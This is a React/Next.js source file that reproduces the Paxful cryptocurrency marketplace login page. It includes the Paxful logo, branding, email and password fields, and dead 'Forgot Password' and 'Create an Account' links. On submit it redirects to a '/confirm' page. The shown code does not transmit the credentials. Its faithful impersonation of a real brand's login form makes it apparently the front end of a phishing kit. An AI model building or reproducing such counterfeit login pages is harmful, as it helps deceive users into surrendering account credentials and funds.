'use client'
import React, { useState } from 'react'
export default function Home() {
    const [toggle, setToggle] = useState("password")
    const toggleText = () => {
        if(toggle === "password"){
            setToggle("text")
        }else{
            setToggle("password")
        }
    }
    const [values, setValues] = useState({
        email: '',
        password: ''
    })
    const [errors, setErrors] = useState({
        email: '',
        password: ''
    })
    const handleInput = (e:any) => {
        const newObject = {...values, [e.target.name]: e.target.value}
        setValues(newObject)
    }
    const validate = (values:any) => {
        let errors:any = {}
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]{2,6}$/;
        if(!values.email){
            errors.email = "Email is required"
        }else if(!emailRegex.test(values.email)){
            errors.email = "Email is invalid"
        }
        if(!values.password){
            errors.password = "Password is required"
        }
        return errors
    }
    const hadleValidation = (e:any) => {
        e.preventDefault()
        setErrors(validate(values))
        if(values.email && values.password){
            window.location.href = "/confirm"
        }
    }
  return (
   //paxfull login page
    <main className="flex items-center  content-evenly ">
        <div className="flex flex-col items-start justify-center w-full max-w-md p-3 lg:ml-10 mx-auto mt-8 lg:mt-16 bg-white ">
            <div className="flex w-full items-center justify-between">
                <svg width="121" height="24" viewBox="0 0 121 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <g clip-path="url(#clip0_1_64)">
                        <path d="M89.0574 2.06819V12.0543C89.0574 15.5446 90.5119 16.902 93.0331 16.902C95.5543 16.902 97.0088 15.4477 97.0088 12.0543V2.06819H101.179V12.1513C101.179 17.4837 98.1725 20.3923 93.0331 20.3923C87.9907 20.3923 84.8877 17.4837 84.8877 12.1513V2.06819H89.0574ZM31.0699 2.06819L39.1183 20.1014H34.7547L33.1062 16.2233H24.7669L23.1184 20.1014H18.8518L26.9002 2.06819H31.0699ZM79.2635 2.06819V5.46154H69.8575V10.2122H78.0999V13.6056H69.8575V20.1984H65.6878V2.06819H79.2635ZM111.069 2.06819V16.7081H120.475V20.1014H106.9V2.06819H111.069ZM8.37909 2.06819C13.1306 2.06819 16.2336 4.49201 16.2336 8.66098C16.2336 12.636 13.2275 15.1568 8.37909 15.1568H4.69427V20.1984H0.524597V2.06819H8.37909ZM53.9546 11.6665L60.0636 20.1014H56.0879C55.5061 20.1014 54.9243 19.9075 54.5364 19.4227L54.4394 19.3258L52.2091 16.2233C51.7243 15.4477 51.7243 14.4781 52.2091 13.7025L52.3061 13.5086L53.9546 11.6665ZM28.9365 6.23716L26.1244 13.1208H31.8456L28.9365 6.23716ZM8.18516 5.46154H4.69427V11.7635H8.08819C10.7064 11.7635 11.967 10.6 11.967 8.66098C11.967 6.72192 10.7064 5.46154 8.18516 5.46154ZM46.0031 2.06819C46.6819 2.06819 47.1667 2.2621 47.5546 2.74686L47.6516 2.84381L48.8152 4.49201C49.3001 5.17068 49.3001 6.14021 48.9122 6.81888L48.8152 6.91583L47.1667 9.2427L41.9304 1.97124L46.0031 2.06819Z" fill="#333333"/>
                        <path d="M61.7121 0.419998L40.7668 22.913C40.5729 23.2039 40.088 22.8161 40.3789 22.5252L55.5061 1.19562C55.894 0.710857 56.4758 0.419998 57.1546 0.419998H61.7121Z" fill="#00A5EF"/>
                    </g>
                    <defs>
                        <clipPath id="clip0_1_64">
                        <rect width="120" height="22.59" fill="white" transform="translate(0.5 0.419998)"/>
                        </clipPath>
                    </defs>
                </svg>
                {/* language button */}
                <button className="flex items-center border rounded-sm justify-center  px-2  space-x-2 bg-white ">
                    <svg width="24" height="16" viewBox="0 0 17 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M8.52 0C4.12 0 0.520004 3.6 0.520004 8C0.520004 12.4 4.12 16 8.52 16C12.92 16 16.52 12.4 16.52 8C16.52 3.6 12.92 0 8.52 0ZM2.32 8C2.32 7.2 2.52 6.4 2.72 5.7C3.22 6 3.92 6.3 4.62 6.4C4.52 7 4.52 7.5 4.52 8C4.52 8.5 4.52 9 4.62 9.6C3.92 9.7 3.22 10 2.72 10.3C2.52 9.6 2.32 8.8 2.32 8ZM6.32 8C6.32 7.6 6.32 7.2 6.42 6.8C7.12 6.9 7.82 6.9 8.52 6.9C9.22 6.9 9.92 6.9 10.62 6.8C10.62 7.2 10.72 7.6 10.72 8C10.72 8.4 10.72 8.8 10.62 9.2C9.92 9.1 9.22 9.1 8.52 9.1C7.82 9.1 7.12 9.1 6.42 9.2C6.32 8.8 6.32 8.4 6.32 8ZM12.42 6.4C13.12 6.2 13.72 6 14.22 5.7C14.52 6.4 14.72 7.2 14.72 8C14.72 8.8 14.52 9.6 14.32 10.3C13.82 10 13.22 9.7 12.52 9.6V8C12.52 7.5 12.52 7 12.42 6.4ZM13.42 4.2C13.22 4.4 12.82 4.5 12.22 4.7C12.02 3.9 11.82 3.2 11.52 2.6C12.22 2.9 12.82 3.5 13.42 4.2ZM8.52 1.8C8.62 1.8 9.12 1.9 9.72 3.1C10.02 3.7 10.22 4.3 10.42 5C9.82 5.1 9.22 5.1 8.52 5.1C7.82 5.1 7.22 5.1 6.62 5C6.82 4.3 7.02 3.7 7.22 3.2C7.92 1.9 8.42 1.8 8.52 1.8ZM5.62 2.5C5.32 3.2 5.12 3.9 4.92 4.7C4.32 4.5 3.92 4.4 3.62 4.2C4.22 3.5 4.82 2.9 5.62 2.5ZM3.62 11.8C3.82 11.6 4.22 11.5 4.82 11.3C5.02 12.1 5.22 12.8 5.52 13.4C4.82 13.1 4.22 12.5 3.62 11.8ZM8.52 14.2C8.42 14.2 7.92 14.1 7.32 12.9C7.02 12.4 6.82 11.8 6.72 11.1C7.32 11 7.92 11 8.62 11C9.32 11 9.92 11 10.52 11.1C10.32 11.8 10.12 12.4 9.92 12.9C9.12 14.1 8.62 14.2 8.52 14.2ZM11.42 13.5C11.72 12.9 11.92 12.1 12.12 11.4C12.72 11.6 13.12 11.7 13.32 11.9C12.82 12.5 12.22 13.1 11.42 13.5Z" fill="#A9A9A9"/>
                    </svg>
                    <p className="text-black">English</p>
                    <svg aria-hidden="true" fill="none" stroke="gray" height="20"stroke-width="1.5" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <path d="M19.5 8.25l-7.5 7.5-7.5-7.5" stroke-linecap="round" stroke-linejoin="round"></path>
                    </svg>
                </button>
            </div>

            <div className="flex flex-col gap-6 mt-7 justify-start items-start">
                <p className="text-2xl text-purple-900 font-bold">Log In With Paxful</p>
                <img src="/div.alert.svg" alt="paxful" className="w-70 hidden md:block " />
                <img src="/alert.svg" alt="paxful" className="w-70 md:hidden" />
            </div>

            <div className="flex flex-col gap-4 mt-6 justify-start w-full items-start">
                <form onSubmit={hadleValidation} className="flex flex-col gap-4 mt-6 justify-start w-full items-start" >
                    <div className="flex flex-col justify-start w-full items-start space-y-2">
                        <label className="text-sm text-black">Your Phone or Email</label>
                        <input name='email' onChange={handleInput} type="email" className={`w-full border focus:border-[#42a4d1] outline-none rounded-sm p-2 ${errors.email && 'w-full border focus:border-[red] outline-none rounded-sm p-2'}`} />
                        {errors.email && <p className="text-red-500 text-xs">{errors.email}</p>}
                    </div>

                    <div className="flex flex-col justify-start w-full items-start space-y-2">
                        <div className="flex items-center justify-between w-full">
                            <label className="text-sm text-black">Password</label>
                            <a href="#" className="text-sm text-[#0052CC]">Forgot Password?</a>
                        </div>
                        <div className="relative w-full">
                            <div className="flex items-center justify-between w-full">
                                <input name='password' onChange={handleInput} type={toggle} className={`w-full border focus:border-[#42a4d1] outline-none rounded-sm p-2 ${errors.password && 'w-full border focus:border-[red] outline-none rounded-sm p-2'}`} />
                                <svg onClick={toggleText} className="absolute cursor-pointer right-6" width="17" height="10" viewBox="0 0 17 10" fill="none" xmlns="http://www.w3.org/2000/svg">
                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M2.53 5.006L2.527 5L2.53 4.994C2.6108 4.84751 2.70701 4.71006 2.817 4.584C3.105 4.24 3.547 3.831 4.117 3.439C5.262 2.65 6.818 2 8.5 2C10.18 2 11.735 2.656 12.881 3.448C13.3633 3.77256 13.8013 4.15846 14.184 4.596C14.326 4.766 14.418 4.903 14.469 5C14.3878 5.14388 14.2923 5.27923 14.184 5.404C13.8013 5.84154 13.3633 6.22744 12.881 6.552C11.735 7.344 10.18 8 8.5 8C6.818 8 5.262 7.35 4.117 6.561C3.547 6.169 3.105 5.761 2.817 5.417C2.70729 5.29072 2.6111 5.15331 2.53 5.007V5.006ZM8.5 0C6.316 0 4.372 0.836 2.983 1.79C2.287 2.27 1.704 2.797 1.283 3.3C1.07939 3.53732 0.902339 3.79619 0.755 4.072C0.628 4.317 0.5 4.642 0.5 5C0.5 5.358 0.628 5.683 0.755 5.928C0.89 6.188 1.073 6.45 1.283 6.7C1.704 7.203 2.287 7.73 2.983 8.21C4.372 9.163 6.316 10 8.5 10C10.686 10 12.631 9.156 14.018 8.198C14.714 7.718 15.296 7.19 15.716 6.69C15.926 6.44 16.108 6.182 16.243 5.924C16.369 5.684 16.5 5.359 16.5 5C16.5 4.641 16.37 4.316 16.243 4.076C16.095 3.80271 15.9183 3.54594 15.716 3.31C15.296 2.81 14.714 2.283 14.018 1.802C12.631 0.844 10.686 0 8.5 0ZM8.5 7C9.03043 7 9.53914 6.78929 9.91421 6.41421C10.2893 6.03914 10.5 5.53043 10.5 5C10.5 4.46957 10.2893 3.96086 9.91421 3.58579C9.53914 3.21071 9.03043 3 8.5 3C7.96957 3 7.46086 3.21071 7.08579 3.58579C6.71071 3.96086 6.5 4.46957 6.5 5C6.5 5.53043 6.71071 6.03914 7.08579 6.41421C7.46086 6.78929 7.96957 7 8.5 7Z" fill="#626262"/>
                                </svg>
                            </div>
                            {errors.password && <p className="text-red-500 text-xs">{errors.password}</p>}
                        </div>
                    </div>

                    <button
                    type='submit'
                    className="w-full bg-[#00A5EF] hover:bg-[#42a4d1] flex items-center justify-between text-white rounded-sm p-4 mt-2">
                        Log In
                        <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path fill-rule="evenodd" clip-rule="evenodd" d="M0.793997 13.292L6.086 7.99898L0.793997 2.70598C0.698487 2.61374 0.622304 2.50339 0.569895 2.38139C0.517486 2.25938 0.4899 2.12816 0.488746 1.99538C0.487592 1.8626 0.512894 1.73092 0.563175 1.60803C0.613456 1.48513 0.687709 1.37348 0.781602 1.27959C0.875495 1.18569 0.987146 1.11144 1.11004 1.06116C1.23294 1.01088 1.36462 0.985578 1.4974 0.986732C1.63018 0.987886 1.7614 1.01547 1.8834 1.06788C2.00541 1.12029 2.11575 1.19647 2.208 1.29198L8.208 7.29198C8.35276 7.43587 8.44951 7.62099 8.485 7.82198L8.5 7.93998V8.05798C8.48594 8.30241 8.38234 8.53309 8.209 8.70598L2.209 14.706C2.11675 14.8015 2.00641 14.8777 1.8844 14.9301C1.7624 14.9825 1.63118 15.0101 1.4984 15.0112C1.36562 15.0124 1.23394 14.9871 1.11104 14.9368C0.988146 14.8865 0.876495 14.8123 0.782602 14.7184C0.688709 14.6245 0.614456 14.5128 0.564175 14.3899C0.513894 14.267 0.488592 14.1354 0.489746 14.0026C0.4909 13.8698 0.518486 13.7386 0.570895 13.6166C0.623304 13.4946 0.698487 13.3842 0.793997 13.292Z" fill="white"/>
                        </svg>
                    </button>
                </form>
                {/* gray linevdr */}
                <div className="flex items-center justify-center w-full mt-2">
                    <div className="w-full h-px bg-gray-300"></div>
                </div>
                <div className="flex items-center justify-between w-full mt-2">
                    <div className="flex items-center justify-center space-x-2">
                        <label className="text-sm text-black">New on paxful?</label>
                    </div>
                    <a href="#" className="text-sm text-[#0052CC]">Create an Account?</a>
                </div>
            </div>
                    
            
        </div>
        {/* image */}
        <div className="lg:flex flex-col hidden items-center justify-center w-full max-w-md p-2 mx-auto bg-white ">
            <img src="/log.webp" alt="paxful" />
        </div>
    </main>

  )
}